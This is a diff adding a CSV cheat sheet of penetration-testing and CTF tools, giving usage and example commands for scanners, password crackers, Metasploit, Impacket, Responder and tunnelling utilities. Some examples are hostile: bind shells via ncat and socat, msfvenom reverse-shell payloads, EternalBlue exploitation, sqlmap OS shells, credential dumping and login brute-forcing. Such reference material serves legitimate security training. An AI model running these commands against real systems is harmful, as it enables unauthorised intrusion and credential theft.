@@ -1,2 +1,923 @@
 command,category,brief,description,usage,examples
--,-,-,-,-,-
+nmap,network,Network exploration and security auditing,Nmap is a powerful network scanner for discovering hosts and services. Supports TCP SYN/Connect/ACK scans, version detection, OS fingerprinting, and NSE scripts.,"nmap [Scan Type(s)] [Options] {target specification}
+Options:
+  -sS: TCP SYN scan (stealth)
+  -sT: TCP Connect scan
+  -sV: Version detection
+  -sC: Default scripts
+  -O: OS detection
+  -Pn: Skip host discovery
+  -p: Port specification
+  -A: Aggressive scan
+  --script: Run NSE scripts","nmap -sV 192.168.1.1
+nmap -sS -p 1-1000 target.com
+nmap -A -T4 192.168.1.0/24
+nmap --script vuln target.com"
+masscan,network,High-speed internet port scanner,Masscan is the fastest port scanner - can scan the entire internet in under 6 minutes. Uses asynchronous transmission.,"masscan [options] <targets>
+Options:
+  -p: Port specification
+  --rate: Packets per second
+  -oL: Output list format
+  --banners: Grab banners
+  --adapter-ip: Source IP","masscan -p80,443 192.168.1.0/24
+masscan -p1-65535 10.0.0.1 --rate=1000
+masscan -p80 0.0.0.0/0 --rate=10000000"
+netcat,network,TCP/UDP network read/write tool,Netcat (nc) is a versatile networking utility for reading and writing data across network connections. Useful for port scanning, file transfers, and reverse shells.,"nc [options] <host> <port>
+Options:
+  -l: Listen mode
+  -v: Verbose
+  -p: Local port
+  -e: Execute command
+  -u: UDP mode
+  -z: Zero-I/O mode (scanning)","nc -lvp 4444
+nc target.com 80
+nc -z -v target.com 1-1000
+echo 'GET /' | nc target.com 80"
+nc,network,Netcat alias for network connections,Netcat alias. Same as netcat command.,"nc [options] <host> <port>
+Options:
+  -l: Listen mode
+  -v: Verbose
+  -p: Local port","nc -lvp 4444
+nc target.com 80"
+ncat,network,Nmap's enhanced netcat with SSL,Ncat is Nmap's reimplementation of netcat with SSL support, connection brokering, and proxying features.,"ncat [options] <host> <port>
+Options:
+  --ssl: Use SSL
+  --proxy: Use proxy
+  -e: Execute command
+  --allow: Allow connections from hosts","ncat --ssl target.com 443
+ncat -lvp 4444 -e /bin/bash
+ncat --proxy proxy:8080 target.com 80"
+curl,network,Transfer data with URLs,Command-line tool for transferring data using various protocols. Essential for web exploitation and API testing.,"curl [options] <URL>
+Options:
+  -X: Request method
+  -d: POST data
+  -H: Header
+  -b: Cookie
+  -o: Output file
+  -v: Verbose
+  -k: Insecure (skip SSL verify)","curl http://target.com
+curl -X POST -d ""user=admin&pass=test"" http://target.com/login
+curl -H ""Authorization: Bearer token"" http://target.com/api"
+wget,network,Non-interactive network downloader,Downloads files from HTTP, HTTPS, and FTP servers. Supports recursive downloads.,"wget [options] <URL>
+Options:
+  -O: Output filename
+  -r: Recursive download
+  -q: Quiet
+  --no-check-certificate: Skip SSL verify","wget http://target.com/file.zip
+wget -O output.txt http://target.com/data
+wget -r http://target.com/directory/"
+tcpdump,network,Command-line packet analyzer,Captures and displays network traffic. Essential for network forensics and debugging.,"tcpdump [options]
+Options:
+  -i: Interface
+  -r: Read from file
+  -w: Write to file
+  -n: Don't resolve names
+  -A: ASCII output
+  -X: Hex and ASCII","tcpdump -i eth0
+tcpdump -r capture.pcap
+tcpdump -i eth0 -w output.pcap
+tcpdump -r capture.pcap -A | grep -i password"
+tshark,network,Terminal Wireshark for protocol analysis,Terminal-based Wireshark. Captures and analyzes network traffic with powerful filtering.,"tshark [options]
+Options:
+  -i: Interface
+  -r: Read file
+  -Y: Display filter
+  -T: Output format
+  -e: Field to print","tshark -r capture.pcap
+tshark -r capture.pcap -Y ""http""
+tshark -r capture.pcap -Y ""http.request.method==POST"" -T fields -e http.file_data"
+amass,network,Subdomain enumeration and network mapping,OWASP Amass performs network mapping by collecting information from various sources including APIs, DNS, and web scraping.,"amass enum [options] -d <domain>
+Options:
+  -d: Target domain
+  -passive: Passive mode only
+  -o: Output file
+  -brute: Brute force","amass enum -d target.com
+amass enum -passive -d target.com
+amass enum -brute -d target.com -o subs.txt"
+subfinder,network,Fast passive subdomain discovery,Subfinder discovers subdomains using passive online sources. Fast and efficient with multiple source support.,"subfinder [options] -d <domain>
+Options:
+  -d: Domain
+  -dL: Domain list file
+  -o: Output file
+  -silent: Silent mode
+  -all: Use all sources","subfinder -d target.com
+subfinder -d target.com -o subs.txt
+subfinder -dL domains.txt -o all_subs.txt"
+httpx,network,Fast HTTP probing and fingerprinting,Httpx probes for web servers and extracts info like status codes, titles, and technologies. Multi-purpose HTTP toolkit.,"httpx [options]
+Options:
+  -l: Input list
+  -u: Target URL
+  -status-code: Show status
+  -title: Show title
+  -tech-detect: Detect tech
+  -content-length: Show length","cat urls.txt | httpx
+httpx -l urls.txt -status-code -title
+cat subs.txt | httpx -tech-detect"
+theharvester,network,Email and domain intelligence gathering,TheHarvester gathers emails, names, subdomains, IPs and URLs from public sources like search engines and PGP servers.,"theHarvester [options] -d <domain>
+Options:
+  -d: Domain
+  -b: Data source (google, bing, etc.)
+  -l: Limit results","theHarvester -d target.com -b google
+theHarvester -d target.com -b all -l 500"
+sqlmap,web,Automatic SQL injection detection/exploitation,SQLmap automates detection and exploitation of SQL injection vulnerabilities. Can enumerate databases, extract data, and get shell access.,"sqlmap [options] -u <URL>
+Options:
+  -u: Target URL with parameter
+  --dbs: Enumerate databases
+  -D: Database to enumerate
+  --tables: Enumerate tables
+  -T: Table to enumerate
+  --dump: Dump table data
+  --os-shell: Get OS shell
+  --batch: Non-interactive mode","sqlmap -u ""http://target.com/page?id=1"" --dbs
+sqlmap -u ""http://target.com/page?id=1"" -D mydb --tables
+sqlmap -u ""http://target.com/page?id=1"" --os-shell"
+nikto,web,Web server vulnerability scanner,Nikto scans web servers for dangerous files, outdated software, and other problems. Checks over 6700 potentially dangerous files.,"nikto -h <host> [options]
+Options:
+  -h: Target host
+  -p: Port
+  -ssl: Force SSL
+  -o: Output file
+  -Display: Show types (1=redirects, 2=cookies, etc.)","nikto -h http://target.com
+nikto -h https://target.com -ssl
+nikto -h target.com -p 8080 -o scan.txt"
+gobuster,web,Directory/file and DNS busting tool,Gobuster brute-forces URIs (directories/files), DNS subdomains, and virtual host names. Fast and flexible.,"gobuster <mode> [options]
+Modes: dir, dns, vhost, fuzz
+Options:
+  -u: Target URL
+  -w: Wordlist
+  -x: File extensions
+  -t: Threads","gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html
+gobuster dns -d target.com -w subdomains.txt"
+dirb,web,Web content scanner,DIRB scans web servers for existing and hidden web objects using dictionary-based attacks.,"dirb <url> [wordlist] [options]
+Options:
+  -o: Output file
+  -r: Don't search recursively
+  -a: User-agent
+  -p: Proxy","dirb http://target.com
+dirb http://target.com /usr/share/wordlists/dirb/big.txt
+dirb http://target.com -o results.txt"
+wfuzz,web,Web fuzzer for brute forcing,WFuzz is a flexible web fuzzer for finding hidden resources, parameters, and vulnerabilities. Uses FUZZ keyword as placeholder.,"wfuzz [options] -z payload,params <url>
+Options:
+  -w: Wordlist
+  -c: Colorize output
+  --hc: Hide responses with code
+  --hw: Hide by word count
+  -d: POST data
+  -H: Header","wfuzz -c -w wordlist.txt http://target.com/FUZZ
+wfuzz -c -w wordlist.txt --hc 404 http://target.com/FUZZ
+wfuzz -c -w wordlist.txt -d ""user=FUZZ&pass=test"" http://target.com/login"
+nuclei,web,Template-based vulnerability scanner,Nuclei scans for vulnerabilities using YAML templates. Fast and highly customizable with community templates.,"nuclei [options] -u <url>
+Options:
+  -u: Target URL
+  -l: URL list
+  -t: Template path
+  -severity: Filter severity
+  -tags: Filter by tags","nuclei -u http://target.com
+nuclei -l urls.txt -t cves/
+nuclei -u target.com -severity critical,high"
+ffuf,web,Fast web fuzzer written in Go,Ffuf is a fast web fuzzer. Uses FUZZ keyword as placeholder. Supports multiple wordlists and matchers.,"ffuf [options] -u <url> -w <wordlist>
+Options:
+  -u: URL with FUZZ
+  -w: Wordlist
+  -fc: Filter status codes
+  -mc: Match codes
+  -H: Headers
+  -X: HTTP method","ffuf -u http://target.com/FUZZ -w wordlist.txt
+ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404
+ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301"
+feroxbuster,web,Fast recursive content discovery,Feroxbuster recursively discovers content using brute force combined with wordlists. Written in Rust for speed.,"feroxbuster [options] -u <url>
+Options:
+  -u: Target URL
+  -w: Wordlist
+  -x: Extensions
+  -t: Threads
+  --burp: Proxy through Burp","feroxbuster -u http://target.com
+feroxbuster -u http://target.com -w wordlist.txt -x php,txt"
+katana,web,Next-generation web crawler,Katana is a fast crawler that discovers endpoints, files, and parameters. Supports JavaScript crawling.,"katana [options] -u <url>
+Options:
+  -u: Target URL
+  -d: Crawl depth
+  -jc: JavaScript crawling
+  -jsl: JSLuice parsing","katana -u http://target.com
+katana -u http://target.com -d 5 -jc"
+dirsearch,web,Web path scanner/brute forcer,Dirsearch brute forces directories and files in web servers with threading and recursion support.,"dirsearch [options] -u <url>
+Options:
+  -u: Target URL
+  -e: Extensions
+  -w: Wordlist
+  -r: Recursive
+  -t: Threads","dirsearch -u http://target.com
+dirsearch -u http://target.com -e php,txt,html"
+whatweb,web,Web application fingerprinting,WhatWeb identifies websites and recognizes CMS, frameworks, server software, and technologies in use.,"whatweb [options] <url>
+Options:
+  -v: Verbose
+  -a: Aggression level (1-4)
+  --log-json: JSON output
+  -i: Input file","whatweb http://target.com
+whatweb -v http://target.com
+whatweb -a 3 http://target.com"
+wpscan,web,WordPress security scanner,WPScan scans WordPress sites for vulnerabilities in core, plugins, and themes. Enumerates users and checks passwords.,"wpscan [options] --url <url>
+Options:
+  --url: Target URL
+  --enumerate: Enumerate (u=users, p=plugins, t=themes)
+  --api-token: API token
+  --passwords: Password list","wpscan --url http://target.com
+wpscan --url http://target.com --enumerate u,p
+wpscan --url http://target.com --enumerate vp"
+commix,web,Command injection testing tool,Commix automates detection and exploitation of command injection vulnerabilities in web applications.,"commix [options] -u <url>
+Options:
+  -u: Target URL
+  --data: POST data
+  --os-cmd: Execute command
+  -v: Verbosity level","commix -u ""http://target.com/page?id=1""
+commix -u ""http://target.com"" --data=""input=test"""
+john,password,Fast password cracker,John the Ripper is a fast password cracker supporting many hash types. Supports dictionary, brute force, and rules-based attacks.,"john [options] <password_file>
+Options:
+  --wordlist: Dictionary file
+  --format: Hash format
+  --show: Show cracked passwords
+  --rules: Enable word mangling
+  --incremental: Brute force mode","john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+john --format=raw-md5 --wordlist=words.txt hashes.txt
+john --show hashes.txt"
+hashcat,password,Advanced GPU password recovery,Hashcat is the world's fastest password recovery tool. Supports 300+ hash types and multiple attack modes with GPU acceleration.,"hashcat [options] <hash_file> [wordlist]
+Options:
+  -m: Hash type (0=MD5, 1000=NTLM, etc.)
+  -a: Attack mode (0=dict, 1=combo, 3=brute)
+  -o: Output file
+  --show: Show cracked
+  -r: Rules file","hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 -a 0 ntlm.txt wordlist.txt
+hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a"
+hydra,password,Network login brute forcer,Hydra is a parallelized login cracker supporting numerous protocols including SSH, FTP, HTTP, SMB, RDP, and more.,"hydra [options] <target> <service>
+Options:
+  -l: Single username
+  -L: Username list
+  -p: Single password
+  -P: Password list
+  -t: Threads
+  -V: Verbose
+  -s: Port","hydra -l admin -P passwords.txt target.com ssh
+hydra -L users.txt -P passwords.txt target.com ftp
+hydra -l admin -P passwords.txt target.com http-post-form ""/login:user=^USER^&pass=^PASS^:Invalid"""
+medusa,password,Parallel modular login brute forcer,Medusa is a speedy, parallel, and modular login brute-forcer supporting many services including SSH, FTP, HTTP, MySQL, and more.,"medusa [options] -h <host> -M <module>
+Options:
+  -h: Target host
+  -H: Host file
+  -u: Username
+  -U: Username file
+  -p: Password
+  -P: Password file
+  -M: Module (ssh, ftp, http, etc.)
+  -t: Threads","medusa -h target.com -u admin -P passwords.txt -M ssh
+medusa -h target.com -U users.txt -P passwords.txt -M ftp"
+crunch,password,Custom wordlist generator,Crunch generates wordlists based on criteria you specify including character sets, min/max length, and patterns.,"crunch <min> <max> [charset] [options]
+Options:
+  -o: Output file
+  -t: Pattern (@=lower, ,=upper, %=number, ^=symbol)
+  -b: Max file size","crunch 8 8 -o wordlist.txt
+crunch 6 6 abc123 -o custom.txt
+crunch 8 8 -t @@@@%%%% -o pattern.txt"
+hashid,password,Hash type identifier,Hashid identifies different types of hashes. Shows corresponding Hashcat mode and John format.,"hashid [options] <hash>
+Options:
+  -e: Extended (include salted)
+  -m: Show hashcat mode
+  -j: Show john format","hashid 5d41402abc4b2a76b9719d911017c592
+hashid -m 5d41402abc4b2a76b9719d911017c592"
+msfconsole,exploitation,Metasploit Framework console,Metasploit is a penetration testing framework with exploits, payloads, and auxiliary modules. Industry standard for exploitation.,"msfconsole [options]
+Commands:
+  search: Find modules
+  use: Select module
+  set: Set options
+  exploit/run: Execute
+  sessions: Manage sessions","msfconsole
+msf> search type:exploit platform:windows
+msf> use exploit/windows/smb/ms17_010_eternalblue
+msf> set RHOSTS target.com
+msf> exploit"
+msfvenom,exploitation,Payload generator and encoder,Msfvenom creates payloads for Metasploit and standalone use. Supports encoding and multiple output formats.,"msfvenom [options]
+Options:
+  -p: Payload
+  -f: Format (exe, elf, raw, etc.)
+  -o: Output file
+  -e: Encoder
+  -b: Bad characters
+  LHOST/LPORT: Callback address","msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe"
+searchsploit,exploitation,Exploit database search,Searchsploit searches the Exploit-DB archive for exploits and shellcode. Offline access to exploit database.,"searchsploit [options] <term>
+Options:
+  -m: Mirror/copy exploit
+  -x: Examine exploit
+  -p: Show path
+  -w: Show URL
+  --cve: Search by CVE","searchsploit apache 2.4
+searchsploit -m 42966
+searchsploit wordpress plugin
+searchsploit --cve 2021-44228"
+crackmapexec,windows,Post-exploitation tool for networks,CrackMapExec automates pentesting of Windows/AD networks. Supports SMB, WinRM, MSSQL, RDP, LDAP, SSH, and FTP.,"crackmapexec <protocol> <target> [options]
+Protocols: smb, winrm, mssql, rdp, ldap, ssh, ftp
+Options:
+  -u: Username
+  -p: Password
+  -H: Hash
+  -d: Domain","crackmapexec smb 192.168.1.0/24
+crackmapexec smb target.com -u admin -p password
+crackmapexec smb target.com -u admin -H <hash>"
+netexec,windows,Network execution and post-exploitation,NetExec is the successor to CrackMapExec. Multi-protocol post-exploitation tool for Windows networks.,"netexec <protocol> <target> [options]
+Protocols: smb, winrm, mssql, vnc, rdp, ldap, wmi, nfs, ssh, ftp
+Options:
+  -u: Username
+  -p: Password
+  -H: Hash","netexec smb 192.168.1.0/24
+netexec smb target.com -u admin -p password"
+evil-winrm,windows,WinRM shell with upload/download,Evil-WinRM provides a shell over WinRM with upload/download features and PowerShell capabilities.,"evil-winrm [options] -i <ip>
+Options:
+  -i: Target IP
+  -u: Username
+  -p: Password
+  -H: NTLM hash
+  -s: Scripts path
+  -e: Executables path","evil-winrm -i 192.168.1.100 -u admin -p password
+evil-winrm -i 192.168.1.100 -u admin -H <ntlm_hash>"
+responder,windows,LLMNR/NBT-NS/MDNS poisoner,Responder poisons LLMNR, NBT-NS, and MDNS requests to capture credentials on local networks.,"responder [options] -I <interface>
+Options:
+  -I: Interface
+  -A: Analyze mode
+  -w: WPAD rogue server
+  -r: NetBIOS wredir
+  -f: Fingerprint hosts","responder -I eth0
+responder -I eth0 -wrf
+responder -I eth0 -A"
+impacket-secretsdump,windows,Extract credentials from targets,Secretsdump extracts credentials from SAM, LSA, NTDS.dit, and cached domain credentials.,"secretsdump.py [options] <target>
+Options:
+  -sam: SAM file
+  -system: SYSTEM file
+  -ntds: NTDS.dit file
+  -just-dc: DC only
+  -history: Include history","impacket-secretsdump domain/user:pass@target
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
+impacket-psexec,windows,Remote command execution via SMB,PsExec executes commands remotely using SMB and named pipes. Provides interactive shell.,"psexec.py [options] <target> [command]
+Format: domain/user:pass@target
+Options:
+  -hashes: NTLM hash
+  -c: Copy file
+  -path: Command path","impacket-psexec domain/admin:password@192.168.1.100
+impacket-psexec -hashes :NTLM_HASH domain/admin@target"
+impacket-smbclient,windows,SMB client for share access,SMBClient connects to SMB shares for browsing, downloading, and uploading files.,"smbclient.py [options] <target>
+Format: domain/user:pass@target
+Options:
+  -hashes: NTLM hash
+  -k: Kerberos auth","impacket-smbclient domain/user:pass@target
+impacket-smbclient -hashes :HASH domain/user@target"
+bloodhound-python,windows,Active Directory relationship mapper,BloodHound-python collects AD data for attack path analysis. Discovers privilege escalation paths.,"bloodhound-python [options] -d <domain>
+Options:
+  -d: Domain
+  -u: Username
+  -p: Password
+  -c: Collection method (All, DCOnly, etc.)
+  --zip: Compress output","bloodhound-python -d domain.local -u user -p pass -c All
+bloodhound-python -d domain.local -u user -p pass -c DCOnly"
+smbmap,windows,SMB share enumeration tool,SMBMap enumerates SMB shares and permissions. Can download/upload files and execute commands.,"smbmap [options] -H <host>
+Options:
+  -H: Host
+  -u: Username
+  -p: Password
+  -d: Domain
+  -r: List directory recursively
+  --download: Download file","smbmap -H 192.168.1.100
+smbmap -H 192.168.1.100 -u user -p pass
+smbmap -H 192.168.1.100 -r share/"
+smbclient,windows,SMB/CIFS client for shares,SMBClient accesses Windows shares from Linux. Standard Samba client.,"smbclient [options] //<host>/<share>
+Options:
+  -U: Username
+  -N: No password
+  -L: List shares","smbclient -L //192.168.1.100 -N
+smbclient //192.168.1.100/share -U user
+smbclient //target/C$ -U 'domain\admin'"
+enum4linux,windows,Windows/Samba enumeration,Enum4linux enumerates information from Windows and Samba systems including users, shares, and policies.,"enum4linux [options] <target>
+Options:
+  -a: All enumeration
+  -U: Get users
+  -S: Get shares
+  -P: Get password policy
+  -G: Get groups","enum4linux -a 192.168.1.100
+enum4linux -U 192.168.1.100"
+binwalk,forensics,Firmware analysis and extraction,Binwalk analyzes, reverse engineers, and extracts firmware images. Identifies embedded files and executable code.,"binwalk [options] <file>
+Options:
+  -e: Extract files
+  -M: Matryoshka (recursive)
+  -D: Extract specific type
+  -B: Signature scan
+  -E: Entropy analysis","binwalk firmware.bin
+binwalk -e firmware.bin
+binwalk -Me firmware.bin
+binwalk -E firmware.bin"
+foremost,forensics,File carving and recovery,Foremost recovers files based on headers, footers, and internal data structures. Works on disk images and raw data.,"foremost [options] -i <input> -o <output_dir>
+Options:
+  -i: Input file
+  -o: Output directory
+  -t: File types (jpg, png, pdf, etc.)
+  -v: Verbose","foremost -i disk.img -o recovered/
+foremost -t jpg,png,pdf -i disk.img -o recovered/"
+steghide,forensics,Steganography hide/extract tool,Steghide hides and extracts data in image and audio files. Supports JPEG, BMP, WAV, and AU formats.,"steghide <command> [options]
+Commands: embed, extract, info
+Options:
+  -cf: Cover file
+  -ef: Embed file
+  -sf: Stego file
+  -p: Password","steghide info image.jpg
+steghide extract -sf image.jpg
+steghide extract -sf image.jpg -p password
+steghide embed -cf image.jpg -ef secret.txt"
+exiftool,forensics,Metadata reader/writer,ExifTool reads, writes and edits metadata in images, audio, video, and documents.,"exiftool [options] <file>
+Options:
+  -all: All metadata
+  -common: Common tags
+  -G: Show group names
+  -json: JSON output","exiftool image.jpg
+exiftool -all image.jpg
+exiftool -json *.jpg"
+file,forensics,Determine file type,Identifies file type by examining magic bytes and structure. Essential first step in analysis.,"file [options] <file>
+Options:
+  -b: Brief mode
+  -i: MIME type
+  -z: Look inside compressed files","file unknown_file
+file -b mystery.bin
+file -i document.pdf"
+xxd,forensics,Hex dump utility,Creates hex dump of a file or reverses it. Useful for examining and modifying binary data.,"xxd [options] <file>
+Options:
+  -r: Reverse (hex to binary)
+  -p: Plain hexdump
+  -l: Length
+  -s: Start offset
+  -c: Columns","xxd file.bin
+xxd -p file.bin
+xxd -l 100 file.bin
+echo '48656c6c6f' | xxd -r -p"
+hexdump,forensics,Hex and binary data viewer,Displays file contents in hexadecimal, ASCII, and other formats.,"hexdump [options] <file>
+Options:
+  -C: Canonical hex+ASCII
+  -n: Number of bytes
+  -s: Skip bytes","hexdump -C file.bin
+hexdump -C -n 100 file.bin"
+strings,reversing,Extract printable strings,Extracts printable character sequences from files. Finds hardcoded strings, passwords, and clues.,"strings [options] <file>
+Options:
+  -a: Scan entire file
+  -n: Minimum string length
+  -e: Encoding (s=7-bit, l=16-bit LE)
+  -t: Print offset","strings binary
+strings -n 10 binary
+strings binary | grep -i password"
+objdump,reversing,Display object file info,Displays information about object files. Disassembles executables and shows headers, symbols, and relocations.,"objdump [options] <file>
+Options:
+  -d: Disassemble executable sections
+  -D: Disassemble all sections
+  -x: Display all headers
+  -t: Symbol table
+  -h: Section headers","objdump -d binary
+objdump -D binary
+objdump -t binary | grep -i flag"
+gdb,reversing,GNU Debugger,GDB debugs programs written in C, C++, and other languages. Essential for binary exploitation and reverse engineering.,"gdb [options] <program>
+Commands:
+  r (run): Run program
+  b (break): Set breakpoint
+  c (continue): Continue
+  si/ni: Step instruction
+  x: Examine memory
+  disas: Disassemble","gdb ./program
+gdb -q ./program
+(gdb) b main
+(gdb) r
+(gdb) x/20x $rsp"
+radare2,reversing,Reverse engineering framework,Radare2 (r2) is a complete framework for reverse-engineering and analyzing binaries. Includes disassembler, debugger, and hex editor.,"r2 [options] <file>
+Options:
+  -A: Analyze on load
+  -d: Debug mode
+  -w: Write mode
+Commands:
+  aaa: Analyze all
+  pdf: Print function disassembly
+  afl: List functions
+  VV: Graph mode","r2 ./binary
+r2 -A ./binary
+[0x00000000]> aaa
+[0x00000000]> pdf @ main"
+checksec,reversing,Check binary security properties,Checksec checks security properties of binaries including RELRO, Stack Canary, NX, and PIE.,"checksec [options] <binary>
+Shows:
+  RELRO: Read-Only relocations
+  Stack: Stack canary
+  NX: Non-executable stack
+  PIE: Position independent","checksec ./binary
+checksec --file=./binary"
+ropper,reversing,ROP gadget finder,Ropper searches binaries for ROP gadgets. Supports multiple architectures and can generate chains.,"ropper [options] -f <binary>
+Options:
+  -f: File to analyze
+  --search: Search for gadgets
+  -I: Info about binary
+  --chain: Generate chain","ropper -f ./binary
+ropper -f ./binary --search ""pop rdi""
+ropper -f ./binary --chain execve"
+ROPgadget,reversing,ROP gadget search tool,ROPgadget finds gadgets in binaries for exploit development. Uses Capstone disassembler.,"ROPgadget [options] --binary <file>
+Options:
+  --binary: Target file
+  --ropchain: Generate chain
+  --only: Filter gadgets
+  --badbytes: Exclude bytes","ROPgadget --binary ./vuln
+ROPgadget --binary ./vuln --ropchain
+ROPgadget --binary ./vuln --only ""pop|ret"""
+ltrace,reversing,Library call tracer,Traces library calls made by a program. Useful for understanding program behavior.,"ltrace [options] <program> [args]
+Options:
+  -e: Filter functions
+  -s: String display length
+  -o: Output file","ltrace ./program
+ltrace -e strcmp ./program
+ltrace -s 100 ./program"
+strace,reversing,System call tracer,Traces system calls and signals. Shows how a program interacts with the OS.,"strace [options] <program> [args]
+Options:
+  -e: Filter syscalls
+  -f: Follow forks
+  -o: Output file
+  -p: Attach to PID","strace ./program
+strace -e open,read,write ./program
+strace -f ./program"
+base64,crypto,Base64 encode/decode,Encodes or decodes data using Base64 encoding. Common in CTFs for obfuscating strings.,"base64 [options] [file]
+Options:
+  -d: Decode
+  -w: Wrap at column","echo 'Hello' | base64
+echo 'SGVsbG8=' | base64 -d
+base64 file.bin"
+openssl,crypto,Cryptographic toolkit,OpenSSL is a toolkit for SSL/TLS and general cryptography. Encrypts, decrypts, hashes, and generates keys.,"openssl <command> [options]
+Commands:
+  enc: Encrypt/decrypt
+  dgst: Hash functions
+  rsa: RSA operations","openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt
+openssl dgst -md5 file.txt
+openssl dgst -sha256 file.txt"
+chisel,tunneling,TCP/UDP tunnel over HTTP,Chisel creates fast TCP/UDP tunnels over HTTP for pivoting and port forwarding.,"chisel <mode> [options]
+Modes: server, client
+Server: chisel server -p <port> --reverse
+Client: chisel client <server> <tunnels>","# Server
+chisel server -p 8080 --reverse
+# Client reverse port forward
+chisel client server:8080 R:8888:127.0.0.1:80"
+proxychains4,tunneling,Proxy chaining tool,Proxychains routes connections through proxies (SOCKS/HTTP) for anonymity and pivoting.,"proxychains4 [options] <command>
+Config: /etc/proxychains4.conf
+Options:
+  -q: Quiet mode
+  -f: Config file","proxychains4 nmap -sT target.com
+proxychains4 curl http://target.com"
+socat,tunneling,Multipurpose relay tool,Socat creates bidirectional data transfers between addresses. Swiss army knife for networking.,"socat [options] <addr1> <addr2>
+Address types:
+  TCP-LISTEN, TCP
+  UDP-LISTEN, UDP
+  EXEC, FILE, STDIO","socat TCP-LISTEN:8080,fork TCP:target:80
+socat TCP-LISTEN:4444 EXEC:/bin/bash
+socat FILE:file.txt TCP:target:1234"
+grep,general,Search text patterns,Searches for patterns in files using regular expressions. Essential for finding flags and filtering output.,"grep [options] <pattern> <file>
+Options:
+  -i: Case insensitive
+  -r: Recursive
+  -n: Line numbers
+  -o: Only matching part
+  -E: Extended regex","grep -i ""flag"" file.txt
+grep -r ""password"" .
+grep -oE ""flag\{[^}]+\}"" *"
+find,general,Search for files,Searches directory tree for files matching criteria. Finds hidden files and specific types.,"find <path> [options]
+Options:
+  -name: Filename pattern
+  -type: File type (f=file, d=dir)
+  -size: File size
+  -exec: Execute command","find . -name ""*.txt""
+find / -name ""flag*"" 2>/dev/null
+find . -type f -exec grep -l ""password"" {} \;"
+awk,general,Pattern scanning and processing,Powerful text processing language. Great for extracting fields and transforming data.,"awk [options] 'pattern {action}' <file>
+Variables:
+  $0: Entire line
+  $1,$2...: Fields
+  NR: Record number
+  NF: Number of fields","awk '{print $1}' file.txt
+awk -F: '{print $1,$3}' /etc/passwd
+awk '/flag/ {print}' file.txt"
+sed,general,Stream editor,Stream editor for filtering and transforming text. Useful for search and replace.,"sed [options] 's/pattern/replacement/' <file>
+Options:
+  -i: Edit in place
+  -n: Suppress output
+  -E: Extended regex","sed 's/old/new/' file.txt
+sed -i 's/old/new/g' file.txt
+sed -n '5,10p' file.txt"
+python3,general,Python interpreter,Python programming language. Essential for writing exploits and using security libraries.,"python3 [options] [script.py]
+Useful modules:
+  pwntools: CTF/exploit framework
+  requests: HTTP library
+  socket: Network programming","python3 -c ""print('A'*100)""
+python3 exploit.py
+python3 -c ""from pwn import *; p = remote('host',1337)"""
+pwntools,general,CTF framework for Python,Python library for rapid exploit development. Provides utilities for binary exploitation and networking.,"from pwn import *
+Functions:
+  remote(host, port): Connect
+  process(binary): Local process
+  p32/p64: Pack integers
+  u32/u64: Unpack integers
+  asm/disasm: Assembly","from pwn import *
+p = remote('target.com', 1337)
+p.sendline(b'payload')
+p.interactive()"
+rlwrap,general,Readline wrapper for shells,Rlwrap adds readline support to commands for better shell interaction with history and editing.,"rlwrap [options] <command>
+Options:
+  -a: Always readline
+  -c: Complete filenames","rlwrap nc -lvp 4444
+rlwrap python3"
+7z2john,password,Extract hash from 7z archives for cracking,Extracts password hashes from 7-Zip archives for use with John the Ripper. Part of the john2* family of hash extractors.,"7z2john <archive.7z> > hash.txt
+Output: Hash in John-compatible format","7z2john encrypted.7z > hash.txt
+john --wordlist=rockyou.txt hash.txt"
+arp-scan,network,ARP scanning and fingerprinting tool,Sends ARP packets to discover hosts on local network. Can fingerprint devices by MAC address vendor lookup.,"arp-scan [options] <target>
+Options:
+  -l: Scan local network
+  -I: Interface
+  --localnet: Scan local subnet
+  -r: Retries","arp-scan -l
+arp-scan -I eth0 --localnet
+arp-scan 192.168.1.0/24"
+arping,network,Send ARP requests to hosts,"Sends ARP requests to discover if a host is alive on the local network. Works at Layer 2, bypassing firewalls that block ICMP.","arping [options] <host>
+Options:
+  -c: Count of packets
+  -I: Interface
+  -w: Timeout","arping 192.168.1.1
+arping -c 3 -I eth0 192.168.1.1"
+bitcoin2john,password,Extract Bitcoin wallet hashes,Extracts password hashes from Bitcoin wallet.dat files for cracking with John the Ripper.,bitcoin2john <wallet.dat> > hash.txt,"bitcoin2john wallet.dat > bitcoin_hash.txt
+john --wordlist=rockyou.txt bitcoin_hash.txt"
+bulk_extractor,forensics,Extract features from disk images,"Scans disk images, files, or directories and extracts features like email addresses, credit card numbers, URLs, and other patterns without parsing filesystem.","bulk_extractor [options] -o <outdir> <image>
+Options:
+  -o: Output directory
+  -E: Enable specific scanner
+  -e: Enable scanner (with defaults)
+  -x: Disable scanner","bulk_extractor -o output disk.img
+bulk_extractor -E email -o results disk.raw"
+davtest,web,WebDAV exploitation tool,Tests WebDAV enabled servers for file upload vulnerabilities. Attempts to upload various file types to find executable uploads.,"davtest [options] -url <url>
+Options:
+  -url: Target URL
+  -auth: Authentication (user:pass)
+  -directory: Test directory
+  -uploadfile: Custom file to upload","davtest -url http://target.com/webdav/
+davtest -url http://target.com/dav -auth admin:admin"
+dirb-gendict,web,Generate custom wordlists for dirb,Generates custom dictionaries for directory brute-forcing based on patterns or base words.,dirb-gendict <options>,dirb-gendict
+dnsrecon,network,DNS enumeration and reconnaissance,"Performs DNS enumeration including zone transfers, reverse lookups, subdomain bruteforcing, and record enumeration.","dnsrecon [options] -d <domain>
+Options:
+  -d: Domain
+  -t: Type (std, rvl, brt, srv, axfr, etc.)
+  -D: Dictionary file
+  -a: Perform zone transfer","dnsrecon -d target.com
+dnsrecon -d target.com -t axfr
+dnsrecon -d target.com -D subdomains.txt -t brt"
